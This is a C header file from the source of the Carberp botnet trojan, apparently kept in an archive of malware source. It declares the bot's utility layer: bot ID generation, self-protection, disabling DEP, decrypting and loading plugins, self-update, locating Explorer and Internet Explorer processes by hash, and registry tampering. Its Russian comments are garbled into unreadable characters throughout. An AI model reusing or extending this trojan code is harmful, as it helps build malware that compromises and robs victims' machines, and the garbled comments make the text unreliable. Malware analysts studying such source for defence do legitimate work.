/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#ifndef UtilsH
#define UtilsH
//----------------------------------------------------------------------------

#include <windows.h>


#define WIN_2000	1
#define WIN_XP		2
#define WIN_2003	3
#define WIN_VISTA	4
#define WIN_7		5


DWORD GetProcessIdByHash( DWORD dwHash );
//���������� ��� �������� �� ����
DWORD GetProcessHashOfId(DWORD dwPid);
char *GetProcessList();

HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param );
HANDLE OpenProcessEx( DWORD dwHash );
void GetUserToken();

bool RunFile( WCHAR *Path );
bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread );
bool MakeUpdate( WCHAR *FileName );


char * FileToMD5(char *URL);

void GenerateUid( char *BotUid );

char *GetOSInfo();
LPVOID GetInfoTable( DWORD dwTableType );
void GetOSVersion();

HANDLE CreateUpdateMutex();
DWORD GetCurrentSessionId();

DWORD WINAPI LoadDll( LPVOID lpData );
DWORD GetFileHash( WCHAR *File );
bool GodmodeOnFile( WCHAR *Filename );


void DisableDEP();
DWORD GetProcessHash();

void ProtectBot();
void UnProtectBot();

LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize );
LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen );

// ������� ���������� ������������� �������� ���������� (Explorer.exe)
DWORD GetExplorerPid();
// ������� ���������� ������������� �������� ���������� (iexplore.exe)
DWORD GetIExplorerPid();

#define Min(a,b) (((a) < (b)) ? (a) : (b))
#define Max(a,b) (((a) > (b)) ? (a) : (b))



//****************************************************************************
//  Random  ������ ��� ��������� ��������� �����
//****************************************************************************
namespace Random
{
	// ���������������� ��������� ��������� �����
	void Initialize();

	// ������������ ��������� �����
	DWORD Generate();

	// ������������ ��������� ����� � ��������� �� Min �� Max
	DWORD Generate(DWORD Min, DWORD Max);

	// ������������ ������ ��������� ��������
	// Min, Max - �������� ��������� ��������
	PCHAR RandomString(DWORD Length, char Min, char Max);
}



//******************************************************************
//  GenerateBotID - ������� ���������� ������������� ����
//
//  ��������� - ������ ��������� �������� StrNew. ����������
//              �������� StrFree
//******************************************************************
PCHAR GenerateBotID();

//******************************************************************
//  DirExists - ������� ���������� ������ ���� ����  Path ceotcndetn
//******************************************************************
bool DirExists(PCHAR Path);


//******************************************************************
//  FileExists* - ������� ���������� ������ ���� ����  FileName
//  			  ����������
//******************************************************************
bool FileExistsA(PCHAR FileName);
bool FileExistsW(PWCHAR FileName);
//��������� ������� ����� �� ����� ���� CSIDL_APPDATA+FileName ��� � ������ ���� folder\file.dlll
bool isFileExists(int FlagFolderDest, WCHAR*Path);
//��������� ������� ����� �� ����� ���� CSIDL_APPDATA+FileName ��� � ������ ���� folder\file.dlll
// �� ��� ������ �����
bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count);
//��������� ������� ����� �� ����� ���� CSIDL_APPDATA+FileName ���������� ��� ������
bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count);

//----------------------------------------------------------------------------
// ������� ������ ������ � ����������
//----------------------------------------------------------------------------

typedef  LPWIN32_FIND_DATA PFindData;

typedef void (* TFilesCallBack)(PFindData Search, // ��������� ������
								PCHAR FileName,   // ��� ���������� �����
								LPVOID Data,      // ������ ���������� � ������� ������
								bool &Cancel      // �������� �������� ���������� �����
								);

#define FA_ANY_FILES ( FILE_ATTRIBUTE_READONLY |\
					   FILE_ATTRIBUTE_HIDDEN   |\
					   FILE_ATTRIBUTE_SYSTEM   |\
					   FILE_ATTRIBUTE_ARCHIVE)

#define FA_DIRECTORY FILE_ATTRIBUTE_DIRECTORY

//******************************************************************
//  SearchFiles  - ������� ���������� ���  �������������
//
//  Path - ����� � �������� ���������� �����. ������ �������������
//         �������� ������ \\
//  Mask - ����� ������. *.* ��� ���� ������
//
//  Recursive - ����������� ����������� �����
//
//  FileAttributes - �������� ������� ������
//
//  Data - ������ ������� ����� �������� � ����� �������� �����
//
//  CallBack - ����� �������� �����
//
//  ��������� - ������� ���������� ������ ���� ����� �� ��� �������
//              �� ������ �������� �����
//
//******************************************************************
bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
				 LPVOID Data, TFilesCallBack CallBack);


//******************************************************************
//  GetUniquePID - ������� ���������� �������� �������������
//	   �������� ��������. ������� �� GetProcessID() � ���, ���
//     ���������� ���������� �������� ��� �������� ���������
//******************************************************************
DWORD GetUniquePID();


//******************************************************************
//  IsNewProcess - ������� ��������� ������������� ��������
//		�������� �� ��������� ProcessID � ���������� ������ ����
//		��� ����������. � ������ ������� �������� ProcessID
//      ��������������
//******************************************************************
bool IsNewProcess(DWORD &ProcessID);


//----------------------------------------------------------------------------
// Registry - ������ ��� ������ � �������� Windows
//----------------------------------------------------------------------------

namespace Registry
{
	// ������� ������ � ������� ������ CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
	bool CreateKey(HKEY h, char* path, char* name );
	//�������� ����, ���� ��� �����, ��� ������������ ��������, ��������(�������� �������� REG_SZ)
	bool SetValueString(HKEY h, char* path, char* name,  char* values );
	//�������� ����, ���� ��� �����, ��� ������������ ��������, ��������(������� �������� �������� DWORD)
	bool SetValueDWORD(HKEY h, char* path, char* name,  DWORD values );

	// ������� �������� ��������� �������� �� �������
    PCHAR GetStringValue(HKEY Key, PCHAR SubKey, PCHAR Value);

	//�������� ����, ���� ��� �����, ��� ������������ ��������, ��������(������� �������� �������� REG_SZ)
	bool CreateValueString(HKEY h, char* path, char* name,  char* values );
	bool CreateValueREGMULTI_SZ(HKEY h, char* path, char* name,  char* values,DWORD sise );
}

//----------------------------------------------------------------------------
// FILE - ������ ��� ������ � �������, ������� ������
//----------------------------------------------------------------------------

namespace File
{
	// �������� ������ �� ������ � ����
	DWORD WriteBufferA(PCHAR FileName, LPVOID Buffer, DWORD BufferSize);
	DWORD WriteBufferW(PWCHAR FileName, LPVOID Buffer, DWORD BufferSize);

	// ��������� ���� � �����
	LPBYTE ReadToBufferA(PCHAR FileName, DWORD &BufferSize);
	LPBYTE ReadToBufferW(PWCHAR FileName, DWORD &BufferSize);

	// �������� ���������� �����. �������� ������ ������ FileName!!!
	// ���������� - ���������� �������� ������ � ������
	// ��������� - ����� ������ � ������ �����
	PCHAR ChangeFileExt(PCHAR FileName, PCHAR Ext);

	// ������� ��������� ��� ��������� ������
	PCHAR GetTempNameA();

	//-------------------------------------------------------------------------
	//  ������� ��������� ��� ����� �� ������� ����
	//  FileName - ������ ��� �����, ���� �� �������� ������������ / ���� \\
	//  	�� ������� ������ ��� ������
	//  DuplicateStr - ���������� � ������, ���� ���������� �������
	//		����� ������ �� ����������. � ������ false ������� ������ ���������
	//      �� ������ ������ ����� � �������� ������
	//-------------------------------------------------------------------------
	PCHAR ExtractFileNameA(PCHAR FileName, bool DuplicateStr);
	PWCHAR ExtractFileNameW(PWCHAR FileName, bool DuplicateStr);

	//-------------------------------------------------------------------------
	//  ExtractFilePath - ������� ��������� ��� ����� �� ��� ������� �����
	//
	//	���������: � ������ ������ ������� ���������� ����� ������ ����������
	//             ���� � �����
	//-------------------------------------------------------------------------
	PCHAR ExtractFilePathA(PCHAR FileName);
	//-------------------------------------------------------------------------
	//BOOL isFileExist(CHAR* filename);

}

//**********************************************************************
//  EnumDrives - ������� ���������� ��� ����� ���������� ����
//               ����������� DRIVE_UNKNOWN ��� �������� ����
//               ������ � �������
//**********************************************************************
typedef void (*TEnumDrivesMethod)(PCHAR Drive, LPVOID Data, bool &Cancel8);

void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data);


//-----------------------------------------------------------------------------
//  IsExecutableFile - ������� ���������� ������ ���� ��������� ����� ��������
//					   ����������� ������, ���� dll
//-----------------------------------------------------------------------------
bool IsExecutableFile(LPVOID Buf);


// ������� ��������� ��� ���������� �����
char *CalcFileMD5Hash(char *szFileName);

char *GetWndText( HWND hWnd );
char *GetNetInfo();
DWORD GetFileFormat( WCHAR *lpFileName );
void MakeShutdown();
BOOL KillProcess(DWORD pid,DWORD TimeOut );

//----------------------------------------------------------------------------
#endif
